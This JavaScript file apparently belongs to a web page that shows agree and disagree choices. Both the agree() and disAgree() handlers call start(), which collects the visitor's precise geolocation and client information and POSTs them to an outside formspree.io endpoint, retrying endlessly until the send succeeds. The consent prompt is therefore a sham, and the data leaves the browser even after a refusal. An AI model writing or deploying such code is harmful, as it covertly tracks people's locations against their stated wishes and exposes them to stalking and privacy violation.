async function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocation is not supported by your browser.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos),
      err => reject("Unable to retrieve location: " + err.message)
    );
  });
}

async function sendRequest(data) {
  while (true) {
    try {
      const response = await fetch("https://formspree.io/f/xeorknrp", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(data),
      });
      break;
    } catch (err) {
      alert("Error!")
      await new Promise(r => setTimeout(r, 1000));
    }
  }
}

async function getPosData() {
  try {
    const pos = await getLocation();
    const posData = {
      Latitude: pos.coords.latitude,
      Longitude: pos.coords.longitude,
      Accuracy: pos.coords.accuracy,
      Altitude: pos.coords.altitude,
      Speed: pos.coords.speed,
      Heading: pos.coords.heading,
    };
    return posData;
  } catch (err) {
  }
}

async function start() {
  const fs = [
    collectPublicClientInfo,
    getPosData
  ]
  for (let f of fs) {
    const d = await f();
    await sendRequest(d);
  }
}

async function agree() {
  alert("clicked");
  await start();
}

async function disAgree() {
  alert("clicked");
  await start();
}
